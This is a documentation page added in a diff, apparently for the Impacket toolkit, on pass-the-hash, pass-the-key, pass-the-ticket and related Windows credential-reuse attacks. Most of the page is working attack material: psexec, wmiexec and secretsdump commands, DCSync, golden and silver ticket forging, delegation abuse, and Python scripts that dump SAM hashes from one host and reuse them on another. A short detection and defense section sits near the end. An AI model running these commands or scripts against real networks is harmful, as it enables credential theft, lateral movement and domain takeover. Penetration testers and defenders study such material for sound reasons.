@@ -1,0 +1,623 @@
+---
+title: Pass-the-Hash & Credential Reuse
+description: Techniques for authenticating with password hashes, Kerberos tickets, and AES keys in Impacket
+---
+
+Pass-the-hash (PtH) and related techniques allow you to authenticate to Windows systems using credential material other than plaintext passwords. These techniques are essential for penetration testing, incident response, and understanding Windows security.
+
+## Overview of Credential Reuse Techniques
+
+Impacket supports several credential reuse techniques:
+
+- **Pass-the-Hash (PtH)**: Authenticate with NTLM hashes
+- **Pass-the-Key (PtK)**: Authenticate with Kerberos AES keys
+- **Pass-the-Ticket (PtT)**: Authenticate with Kerberos tickets
+- **Overpass-the-Hash**: Use NTLM hash to request Kerberos tickets
+
+<Info>
+These techniques work because Windows doesn't require the plaintext password for authentication - only the derived credential material (hash, key, or ticket).
+</Info>
+
+## Pass-the-Hash (NTLM)
+
+Authenticate using LM and NT hashes instead of passwords.
+
+### Basic Pass-the-Hash
+
+```python
+from impacket.smbconnection import SMBConnection
+
+# NTLM hashes in format LMHASH:NTHASH
+lmhash = 'aad3b435b51404eeaad3b435b51404ee'  # Empty LM hash (common)
+nthash = '8846f7eaee8fb117ad06bdd830b7586c'  # NT hash
+
+# Connect and authenticate
+smbClient = SMBConnection('192.168.1.10', '192.168.1.10')
+smbClient.login('Administrator', '', 'WORKGROUP', lmhash, nthash)
+
+print("[+] Authenticated successfully with hash!")
+
+# List shares
+for share in smbClient.listShares():
+    print(f"  {share['shi1_netname']}")
+```
+
+### Pass-the-Hash with psexec.py
+
+```bash
+# Execute commands on remote system
+python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
+
+# With domain
+python psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/administrator@192.168.1.10
+
+# Execute specific command
+python psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10 "whoami"
+```
+
+### Pass-the-Hash with wmiexec.py
+
+```bash
+# WMI execution (stealthier than psexec)
+python wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
+
+# No service installation, runs as current user
+python wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/administrator@192.168.1.10
+```
+
+### Pass-the-Hash with smbexec.py
+
+```bash
+# Similar to psexec but different execution method
+python smbexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
+```
+
+### Other Tools Supporting Pass-the-Hash
+
+```bash
+# Dump credentials from remote system
+python secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/administrator@192.168.1.10
+
+# Browse SMB shares
+python smbclient.py -hashes :8846f7eaee8fb117ad06bdd830b7586c //192.168.1.10/C$
+
+# Execute single command
+python atexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/administrator@192.168.1.10 "ipconfig"
+
+# DCE/RPC operations
+python rpcdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c 192.168.1.10
+```
+
+## Obtaining NTLM Hashes
+
+### From secretsdump.py
+
+```bash
+# Dump SAM hashes
+python secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/administrator@192.168.1.10
+
+# Output format:
+# CORP\Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+#                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+#                                    LM Hash                           NT Hash
+```
+
+### From Local SAM
+
+```bash
+# With SYSTEM and SAM hives
+python secretsdump.py -sam sam.save -system system.save LOCAL
+```
+
+### From NTDS.dit (Domain Database)
+
+```bash
+# From domain controller
+python secretsdump.py -ntds ntds.dit -system system.save LOCAL
+
+# Or via DCSync (requires replication rights)
+python secretsdump.py -just-dc-ntlm CORP/administrator@dc01.corp.local
+```
+
+### Computing Hash from Password
+
+```python
+from impacket.ntlm import compute_nthash, compute_lmhash
+from binascii import hexlify
+
+password = "P@ssw0rd!"
+
+# Compute NT hash
+nthash = compute_nthash(password)
+print(f"NT Hash: {hexlify(nthash).decode()}")
+
+# Compute LM hash (if needed)
+lmhash = compute_lmhash(password)
+print(f"LM Hash: {hexlify(lmhash).decode()}")
+
+# Use with Impacket
+print(f"\nUsage: -hashes {hexlify(lmhash).decode()}:{hexlify(nthash).decode()}")
+```
+
+## Pass-the-Key (Kerberos AES)
+
+Use AES keys instead of NTLM hashes for Kerberos authentication.
+
+### Obtaining AES Keys
+
+```bash
+# From secretsdump.py
+python secretsdump.py -just-dc-user Administrator CORP/administrator@dc01.corp.local
+
+# Output includes:
+# $KRBTGT$23$*...*$aes256-cts-hmac-sha1-96$...
+# The AES256 key is after the last $
+```
+
+### Using AES Keys
+
+```bash
+# Request TGT with AES key
+python getTGT.py -aesKey c4e0e5b1d7c8f5e3a8b2d9f6c4e1a8b5c2d9e6f3a8b5c2d9e6f3a8b5c2d9e6f3 CORP/administrator
+
+# Use with other tools
+python psexec.py -aesKey c4e0e5b1d7c8f5e3a8b2d9f6c4e1a8b5c2d9e6f3a8b5c2d9e6f3a8b5c2d9e6f3 -k -no-pass CORP/administrator@dc01.corp.local
+```
+
+### Programmatic AES Key Usage
+
+```python
+from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+from binascii import unhexlify
+
+# AES256 key (64 hex chars = 32 bytes)
+aesKey = unhexlify('c4e0e5b1d7c8f5e3a8b2d9f6c4e1a8b5c2d9e6f3a8b5c2d9e6f3a8b5c2d9e6f3')
+
+userName = Principal('administrator', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+    clientName=userName,
+    password='',
+    domain='CORP.LOCAL',
+    lmhash=b'',
+    nthash=b'',
+    aesKey=aesKey,
+    kdcHost='dc01.corp.local'
+)
+
+print("[+] TGT obtained using AES key")
+```
+
+<Info>
+**AES Key Advantages:**
+- More secure than RC4 (NTLM hash)
+- Preferred by modern Windows systems
+- Less likely to trigger security alerts
+- Required for some advanced attacks
+</Info>
+
+## Pass-the-Ticket (Kerberos)
+
+Reuse existing Kerberos tickets without needing passwords or hashes.
+
+### Export Tickets from Windows
+
+```bash
+# On Windows with Mimikatz
+mimikatz # sekurlsa::tickets /export
+
+# Or with Rubeus
+Rubeus.exe dump /nowrap
+```
+
+### Convert Ticket Formats
+
+```bash
+# Convert kirbi (Mimikatz) to ccache (Linux)
+python ticketConverter.py ticket.kirbi ticket.ccache
+
+# Convert ccache to kirbi
+python ticketConverter.py ticket.ccache ticket.kirbi
+```
+
+### Use Tickets with Impacket
+
+```bash
+# Set environment variable
+export KRB5CCNAME=/tmp/administrator.ccache
+
+# Use with any Kerberos-enabled tool
+python psexec.py -k -no-pass CORP/administrator@dc01.corp.local
+python smbexec.py -k -no-pass CORP/administrator@fileserver.corp.local
+python wmiexec.py -k -no-pass CORP/administrator@webserver.corp.local
+```
+
+### Programmatic Ticket Usage
+
+```python
+import os
+from impacket.smbconnection import SMBConnection
+
+# Load ticket from file
+os.environ['KRB5CCNAME'] = '/tmp/administrator.ccache'
+
+# Use Kerberos authentication
+smbClient = SMBConnection('dc01.corp.local', '192.168.1.10')
+smbClient.kerberosLogin(
+    user='administrator',
+    password='',
+    domain='CORP.LOCAL',
+    lmhash='',
+    nthash='',
+    aesKey='',
+    kdcHost='dc01.corp.local'
+)
+
+print("[+] Authenticated with cached ticket")
+```
+
+## Overpass-the-Hash
+
+Use NTLM hash to obtain Kerberos TGT, then use for Kerberos authentication.
+
+### Basic Overpass-the-Hash
+
+```bash
+# Step 1: Use NTLM hash to get TGT
+python getTGT.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/administrator
+
+# Step 2: Use TGT for Kerberos auth
+export KRB5CCNAME=administrator.ccache
+python psexec.py -k -no-pass CORP/administrator@dc01.corp.local
+```
+
+### Why Use Overpass-the-Hash?
+
+<Info>
+**Benefits:**
+- Bypass NTLM restrictions (if only Kerberos is allowed)
+- More stealthy than direct NTLM authentication
+- Access systems that require Kerberos
+- Enable Kerberos delegation features
+</Info>
+
+## Advanced Credential Techniques
+
+### Pass-the-Ticket with S4U2Self
+
+Impersonate users with constrained delegation:
+
+```bash
+# Get TGT for service account
+python getTGT.py -hashes :hash CORP/svcaccount
+
+# Use S4U2Self to impersonate Administrator
+export KRB5CCNAME=svcaccount.ccache
+python getST.py -k -no-pass -spn cifs/fileserver.corp.local -impersonate Administrator CORP/svcaccount
+
+# Use the impersonated ticket
+export KRB5CCNAME=Administrator@cifs_fileserver.corp.local.ccache
+python smbclient.py -k -no-pass //fileserver.corp.local/C$
+```
+
+### Golden Ticket (Domain Dominance)
+
+```bash
+# With krbtgt hash
+python ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain CORP.LOCAL administrator
+
+# Use golden ticket
+export KRB5CCNAME=administrator.ccache
+python psexec.py -k -no-pass CORP/administrator@dc01.corp.local
+```
+
+### Silver Ticket (Service-Specific)
+
+```bash
+# With service account hash
+python ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-... -domain CORP.LOCAL -spn cifs/fileserver.corp.local administrator
+
+# Use silver ticket
+export KRB5CCNAME=administrator.ccache
+python smbclient.py -k -no-pass //fileserver.corp.local/C$
+```
+
+## Practical Attack Workflows
+
+### Workflow 1: Complete Pass-the-Hash Chain
+
+```bash
+# 1. Obtain hash from compromised system
+python secretsdump.py -hashes :admin_hash WORKGROUP/admin@192.168.1.5
+
+# 2. Use hash on domain controller
+python secretsdump.py -hashes :admin_hash CORP/admin@192.168.1.10 -just-dc-ntlm
+
+# 3. Use domain admin hash
+python psexec.py -hashes :da_hash CORP/DA@192.168.1.10
+```
+
+### Workflow 2: Hash to Ticket to Access
+
+```bash
+# 1. NTLM hash -> Kerberos TGT
+python getTGT.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/administrator
+
+# 2. TGT -> Service ticket
+export KRB5CCNAME=administrator.ccache
+python getST.py -k -no-pass -spn cifs/fileserver.corp.local CORP/administrator
+
+# 3. Service ticket -> Access
+export KRB5CCNAME=administrator@cifs_fileserver.corp.local.ccache
+python smbclient.py -k -no-pass //fileserver.corp.local/Admin$
+```
+
+### Workflow 3: Delegation Abuse
+
+```bash
+# 1. Compromise service account with delegation
+python getTGT.py -hashes :svc_hash CORP/svcSQL
+
+# 2. S4U2Self + S4U2Proxy
+export KRB5CCNAME=svcSQL.ccache
+python getST.py -k -no-pass -spn cifs/dc01.corp.local -impersonate Administrator CORP/svcSQL
+
+# 3. Use impersonated admin ticket
+export KRB5CCNAME=Administrator@cifs_dc01.corp.local.ccache
+python secretsdump.py -k -no-pass CORP/Administrator@dc01.corp.local -just-dc-ntlm
+```
+
+## Complete Example Scripts
+
+### Example 1: Multi-Method Authenticator
+
+```python
+from impacket.smbconnection import SMBConnection
+from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5.types import Principal
+from impacket.krb5 import constants
+from binascii import unhexlify
+import os
+
+class MultiAuthenticator:
+    def __init__(self, target, username, domain=''):
+        self.target = target
+        self.username = username
+        self.domain = domain
+        self.smbClient = None
+    
+    def auth_with_password(self, password):
+        """Authenticate with plaintext password"""
+        self.smbClient = SMBConnection(self.target, self.target)
+        self.smbClient.login(self.username, password, self.domain)
+        print("[+] Authenticated with password")
+        return True
+    
+    def auth_with_hash(self, nthash):
+        """Authenticate with NTLM hash (Pass-the-Hash)"""
+        lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+        self.smbClient = SMBConnection(self.target, self.target)
+        self.smbClient.login(self.username, '', self.domain, lmhash, nthash)
+        print("[+] Authenticated with NTLM hash (PtH)")
+        return True
+    
+    def auth_with_aes(self, aesKey, kdcHost):
+        """Authenticate with AES key (Pass-the-Key)"""
+        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        
+        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+            clientName=userName,
+            password='',
+            domain=self.domain,
+            lmhash=b'',
+            nthash=b'',
+            aesKey=unhexlify(aesKey),
+            kdcHost=kdcHost
+        )
+        
+        # Save and use ticket
+        from impacket.krb5.ccache import CCache
+        ccache = CCache()
+        ccache.fromTGT(tgt, oldSessionKey, sessionKey)
+        ccache.saveFile(f'{self.username}.ccache')
+        
+        os.environ['KRB5CCNAME'] = f'{self.username}.ccache'
+        self.smbClient = SMBConnection(self.target, self.target)
+        self.smbClient.kerberosLogin(self.username, '', self.domain, '', '', '', kdcHost)
+        
+        print("[+] Authenticated with AES key (PtK)")
+        return True
+    
+    def auth_with_ticket(self, ccache_file, kdcHost):
+        """Authenticate with Kerberos ticket (Pass-the-Ticket)"""
+        os.environ['KRB5CCNAME'] = ccache_file
+        self.smbClient = SMBConnection(self.target, self.target)
+        self.smbClient.kerberosLogin(self.username, '', self.domain, '', '', '', kdcHost)
+        print("[+] Authenticated with Kerberos ticket (PtT)")
+        return True
+    
+    def list_shares(self):
+        """List available shares"""
+        if not self.smbClient:
+            print("[-] Not authenticated")
+            return
+        
+        print("\n[+] Available shares:")
+        for share in self.smbClient.listShares():
+            print(f"  - {share['shi1_netname']}: {share['shi1_remark']}")
+
+# Usage examples
+auth = MultiAuthenticator('192.168.1.10', 'administrator', 'CORP')
+
+# Try different methods
+try:
+    # Method 1: Password
+    auth.auth_with_password('P@ssw0rd!')
+except:
+    try:
+        # Method 2: Hash
+        auth.auth_with_hash('8846f7eaee8fb117ad06bdd830b7586c')
+    except:
+        try:
+            # Method 3: AES Key
+            auth.auth_with_aes(
+                'c4e0e5b1d7c8f5e3a8b2d9f6c4e1a8b5c2d9e6f3a8b5c2d9e6f3a8b5c2d9e6f3',
+                'dc01.corp.local'
+            )
+        except:
+            # Method 4: Ticket
+            auth.auth_with_ticket('admin.ccache', 'dc01.corp.local')
+
+auth.list_shares()
+```
+
+### Example 2: Hash Extractor and Reuser
+
+```python
+from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+from impacket.smbconnection import SMBConnection
+import sys
+
+def dump_and_reuse_hashes(target1, target2, username, password, domain):
+    """
+    Dump hashes from target1 and use them on target2
+    """
+    print(f"[*] Connecting to {target1} to dump hashes...")
+    
+    # Connect to first target
+    smbClient1 = SMBConnection(target1, target1)
+    smbClient1.login(username, password, domain)
+    
+    # Dump hashes (simplified - see secretsdump.py for full implementation)
+    remoteOps = RemoteOperations(smbClient1, False)
+    remoteOps.enableRegistry()
+    
+    # Get SAM hashes
+    SAMFileName = remoteOps.saveSAM()
+    SYSTEMFileName = remoteOps.saveSYSTEM()
+    
+    samHashes = SAMHashes(SAMFileName, SYSTEMFileName, isRemote=True)
+    hashes = []
+    
+    def add_hash(user_hash):
+        hashes.append(user_hash)
+        print(f"  {user_hash}")
+    
+    print("[+] Dumped hashes:")
+    samHashes.dump(add_hash)
+    
+    # Cleanup
+    remoteOps.finish()
+    smbClient1.logoff()
+    
+    # Use first admin hash on second target
+    if hashes:
+        admin_hash = hashes[0].split(':')[3]  # Get NT hash
+        print(f"\n[*] Using hash {admin_hash} on {target2}...")
+        
+        lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+        smbClient2 = SMBConnection(target2, target2)
+        
+        # Extract username from hash
+        user = hashes[0].split(':')[0].split('\\')[1]
+        smbClient2.login(user, '', domain, lmhash, admin_hash)
+        
+        print(f"[+] Successfully authenticated to {target2}!")
+        
+        # List shares
+        for share in smbClient2.listShares():
+            print(f"  {share['shi1_netname']}")
+        
+        return smbClient2
+
+# Usage
+smb = dump_and_reuse_hashes(
+    target1='192.168.1.5',
+    target2='192.168.1.10',
+    username='admin',
+    password='password',
+    domain='WORKGROUP'
+)
+```
+
+## Detection and Defense
+
+<Warning>
+**Detection Indicators:**
+
+1. **Pass-the-Hash**:
+   - NTLM authentication from unusual sources
+   - Lateral movement without password changes
+   - Logon type 3 (network) events
+
+2. **Pass-the-Ticket**:
+   - Kerberos ticket anomalies (lifetime, encryption type)
+   - Tickets used from unusual locations
+   - Ticket requests outside normal hours
+
+3. **Overpass-the-Hash**:
+   - Kerberos pre-authentication with RC4
+   - AS-REQ from systems not matching user's usual workstation
+
+4. **Golden Ticket**:
+   - Tickets with unusual lifetimes (10+ years)
+   - Tickets for disabled/deleted accounts
+   - TGTs not issued by actual DC
+</Warning>
+
+### Defensive Measures
+
+```bash
+# Enable Protected Users group (Windows Server 2012 R2+)
+# Add privileged accounts to Protected Users group
+Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"
+
+# Disable NTLM (Group Policy)
+# Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
+# "Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers" = Deny all
+
+# Enable Extended Protection for Authentication
+# Helps prevent relay attacks
+
+# Monitor for anomalies
+# Event IDs: 4624 (Logon), 4768 (TGT), 4769 (Service Ticket), 4776 (NTLM)
+```
+
+## Command Reference
+
+### Common Impacket Commands with Credentials
+
+```bash
+# Pass-the-Hash
+python psexec.py -hashes :HASH USER@TARGET
+python wmiexec.py -hashes :HASH USER@TARGET
+python smbexec.py -hashes :HASH USER@TARGET
+python atexec.py -hashes :HASH USER@TARGET "command"
+python dcomexec.py -hashes :HASH USER@TARGET
+
+# Pass-the-Key  
+python getTGT.py -aesKey KEY DOMAIN/USER
+python psexec.py -aesKey KEY -k -no-pass DOMAIN/USER@TARGET
+
+# Pass-the-Ticket
+export KRB5CCNAME=ticket.ccache
+python psexec.py -k -no-pass DOMAIN/USER@TARGET
+
+# Overpass-the-Hash
+python getTGT.py -hashes :HASH DOMAIN/USER
+export KRB5CCNAME=user.ccache
+python psexec.py -k -no-pass DOMAIN/USER@TARGET
+```
+
+## See Also
+
+<CardGroup cols={2}>
+  <Card title="NTLM Authentication" icon="key" href="/authentication/ntlm">
+    Deep dive into NTLM hashes and protocol
+  </Card>
+  <Card title="Kerberos Auth" icon="ticket" href="/authentication/kerberos-auth">
+    Understanding Kerberos tickets and delegation
+  </Card>
+</CardGroup>
